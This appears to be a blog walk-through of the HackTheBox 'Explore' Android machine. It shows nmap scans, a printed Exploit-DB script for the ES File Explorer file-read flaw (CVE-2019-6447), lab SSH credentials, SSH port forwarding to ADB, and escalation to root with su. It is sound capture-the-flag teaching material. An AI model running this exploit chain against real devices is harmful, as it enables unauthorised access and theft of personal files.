---
title: "Walk-through of Explore from HackTHeBox"
header:
  teaser: /assets/images/2021-09-26-18-35-59.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Android
  - ADB
  - 
---

## Machine Information

![explore](/assets/images/2021-09-26-18-35-59.png)

Explore is rated as an easy machine on HackTheBox. This box is a little different because we're working on an Android device, however the goal is the same we still want that root flag! After an initial enumeration we find a number of open ports. We use a public exploit for arbitrary file access and retrieve credentials which allow us gain access via SSH. We use port forwarding via SSH to allow us to access the ADB daemon running internally on port 5555. From there we get and ADB shell which let's us escalate to root to complete the box.

<!--more-->

Skills required are enumeration and researching exploits. Skills learned are working with Android devices and ADB.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Explore](https://www.hackthebox.eu/home/machines/profile/356) |
| Machine Release Date | 26th June 2021 |
| Date I Completed It | 30th September 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/explore]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/explore]
└─# nmap -p$ports -sC -sV -oA explore 10.10.10.247
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 10:46 BST
Nmap scan report for 10.10.10.247
Host is up (0.029s latency).

PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
44093/tcp open     unknown
<SNIP>
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=9/26%Time=61504192%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44093-TCP:V=7.91%I=7%D=9/26%Time=61504191%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
<SNIP>
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.84 seconds
```

From the box description we know this is an emulated Android device. The list of ports confirm this with a few interesting ones to look at further:

```test
2222/tcp  open     ssh     SSH-2.0-SSH Server - Banana Studio
5555/tcp  filtered freeciv ADB Daemon
42135/tcp open     http    ES File Explorer Name Response httpd
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
```

## ADB Access

First I tried port 5555 which for Android devices is usually the Android Debug Bridge Daemon (ADB). This is usually accessible over the network, but the nmap scan shows it as filtered. Still it's worth a poke to start with, and I find a good post [here](https://labs.f-secure.com/blog/hackin-around-the-christmas-tree/) that gives the basics ADB and how to access it.

When I try to connect I get prompted to install ADB first:

```text
┌──(root💀kali)-[~/htb/explore]
└─# adb connect 10.10.10.247:5555                         
Command 'adb' not found, but can be installed with:
apt install adb
Do you want to install it? (N/y)y
apt install adb
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  adb
0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.
Need to get 104 kB of archives.
After this operation, 267 kB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 adb amd64 1:10.0.0+r36-7 [104 kB]
Fetched 104 kB in 1s (196 kB/s)
Selecting previously unselected package adb.
(Reading database ... 287222 files and directories currently installed.)
Preparing to unpack .../adb_1%3a10.0.0+r36-7_amd64.deb ...
Unpacking adb (1:10.0.0+r36-7) ...
Setting up adb (1:10.0.0+r36-7) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.3.3) ...
```

However I still can't connect:

```text
┌──(root💀kali)-[~/htb/explore]
└─# adb connect 10.10.10.247:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
```

## ES File Explorer Exploit

Says the local daemon has started successfully but we don't get a connection. After a bit more looking in to this I decide to move on to the next port 42135.

I found [this](https://www.exploit-db.com/exploits/50070) Exploit-DB article which looked interesting. Arbitary File Read, worth a try:

```text
┌──(root💀kali)-[~/htb/explore]
└─# searchsploit ES File Explorer
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read    | android/remote/50070.py
```

Let's grab it and have a look:

```text
root@kali:~/htb/explore# searchsploit -m 50070.py                              
  Exploit: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50070
     Path: /usr/share/exploitdb/exploits/android/remote/50070.py
File Type: Python script, ASCII text executable
Copied to: /root/htb/explore/50070.py
```

```python
root@kali:~/htb/explore# more 50070.py         
# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) < 3:
    print(f"USAGE {sys.argv[0]} <command> <IP> [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
```

Looks simple enough, we just point it at the IP of the server and use one of the available commands. Let's try it:

```test
root@kali:~/htb/explore# python3 50070.py getDeviceInfo 10.10.10.247
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```

Not much info there. Let's look at files:

```text
root@kali:~/htb/explore# python3 50070.py listFiles 10.10.10.247
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
name : lib
time : 3/25/20 05:12:02 AM
type : folder
size : 12.00 KB (12,288 Bytes)

name : vndservice_contexts
time : 9/26/21 10:22:10 AM
type : file
size : 65.00 Bytes (65 Bytes)

name : vendor_service_contexts
time : 9/26/21 10:22:10 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_seapp_contexts
time : 9/26/21 10:22:10 AM
type : file
size : 0.00 Bytes (0 Bytes)
<SNIP>
```

## User Credentials

The list of file goes on for a while, skimming through there was nothing interesting. Looking at pictures was more promising:

```text
root@kali:~/htb/explore# python3 50070.py listPics 10.10.10.247
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

What could this one called creds.jpg be! Let's grab it and see:

```text
root@kali:~/htb/explore# python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg  
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
[+] Downloading file...
[+] Done. Saved as `out.dat`.

root@kali:~/htb/explore# file out.dat
out.dat: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=12, manufacturer=Apple, model=iPhone XR, orientation=upper-right, xresolution=174, yresolution=182, resolutionunit=2, software=14.4, datetime=2021:03:06 02:13:37, hostcomputer=iPhone XR, GPS-Data], comment: "Optimized by JPEGmini 3.18.2.210033067-TBTBLN 0x905c306b", baseline, precision 8, 4032x3024, components 3

root@kali:~/htb/explore# mv out.dat creds.jpg
```

We do indeed have what look to be credentials:

![explore-creds](/assets/images/2021-09-26-12-06-15.png)

## User Flag

Looking again at our list of ports we have SSH running on 2222. Let's try the creds with that:

```text
┌──(root💀kali)-[~/htb/explore]
└─# ssh -p 2222 kristi@10.10.10.247
Password authentication
Password: 

:/ $ whoami
u0_a76

:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
```

As expected that gets us in, a little looking finds the user flag:

```text
130|:/ $ ls sdcard
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/ $ cat sdcard/user.txt
<HIDDEN>
```

A looked around for a while without finding a path, then I checked netstat:

```text
1|:/ $ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       0      0 localhost:58550         localhost:5555          ESTABLISHED
tcp6       0      0 localhost:5555          localhost:58558         ESTABLISHED
tcp6       0      0 localhost:5555          localhost:58552         ESTABLISHED
tcp6       0      0 localhost:58540         localhost:5555          ESTABLISHED
tcp6       0      0 localhost:5555          localhost:58550         ESTABLISHED
tcp6       0      0 localhost:58558         localhost:5555          ESTABLISHED
tcp6       0      0 localhost:58548         localhost:5555          ESTABLISHED
tcp6       0      0 localhost:58554         localhost:5555          ESTABLISHED
```

## Port Forwarding

We can see port 5555 is listening on localhost. I can do port forwarding through SSH to port 5555 and use ADB installed on Kali to interact with it:

```text
┌──(root💀kali)-[~/htb/explore]
└─# ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247
Password authentication
Password: 
:/ $
```

So now I'm logged in to SSH as kristi again, but this time any traffic sent to my local 5555 port on Kali will be forwarded through the SSH connection to port 5555 on the box. We can try to connect using ADB again:


kristi:Kr1sT!5h@Rp3xPl0r3!

```text
┌──(root💀kali)-[~/htb/explore]
└─# adb connect localhost:5555
connected to localhost:5555
```

## Root Flag

This time we get connected and the prompt returns so we can start a shell:

```text
┌──(root💀kali)-[~/htb/explore]
└─# adb shell                 
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ whoami
shell
```

It works and we are connected through our tunnel. If you look back at the article I found earlier it says you can just su with no password:

```text
x86_64:/ $ su
:/ # whoami
root
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
```

That also works here, nice!  Now we just need to look around to find the root flag:

```text
:/ # ls -l
dr-xr-xr-x  52 root   root         0 2021-09-25 18:52 acct
lrwxrwxrwx   1 root   root        11 2021-09-25 18:52 bin -> /system/bin
lrwxrwxrwx   1 root   root        50 2021-09-25 18:52 bugreports -> /data/user_de/0/com.android.shell/files/bugreports
drwxrwx---   6 system cache      120 2021-09-25 18:52 cache
lrwxrwxrwx   1 root   root        13 2021-09-25 18:52 charger -> /sbin/charger
drwxr-xr-x   3 root   root         0 2021-09-25 18:52 config
lrwxrwxrwx   1 root   root        17 2021-09-25 18:52 d -> /sys/kernel/debug
drwxrwx--x  37 system system    4096 2021-03-15 16:49 data
<SNIP>

:/ # ls -ls data
<SNIP>
4 drwxrwx--t  42 system   misc     4096 2021-03-13 17:08 misc
4 drwxrwx--t   3 system   misc     4096 2021-03-13 17:16 misc_ce
4 drwxrwx--t   3 system   misc     4096 2021-03-13 17:08 misc_de
4 drwxrwx---   3 nfc      nfc      4096 2021-03-13 17:08 nfc
4 drwxrwx--x   2 root     root     4096 2021-03-13 17:08 ota
4 drwxrwx---   2 system   cache    4096 2021-03-13 17:08 ota_package
4 drwx------   2 root     root     4096 2021-09-25 18:53 property
4 drwxrwx--x   2 system   system   4096 2021-03-13 17:15 resource-cache
4 -rw-------   1 root     root       33 2021-03-13 18:31 root.txt
4 drwx------   2 system   system   4096 2021-03-13 17:08 ss
4 -rw-------   1 root     root      184 2021-04-21 06:08 ssh_starter.sh
4 drwxrwxr-x  19 system   system   4096 2021-09-26 07:16 system
4 drwxrwx---   3 system   system   4096 2021-03-13 17:16 system_ce
4 drwxrwx---   3 system   system   4096 2021-03-13 17:08 system_de
4 drwxrwx--x   2 system   system   4096 2021-03-15 13:05 tombstones
<SNIP>
```

It actually took me ages to find that flag in the data folder! Time to grab it:

```text
:/ # cat data/root.txt
<HIDDEN>
```

That's another box completed. I like this one for being different, and it's the first Android one I've done.

See you next time.
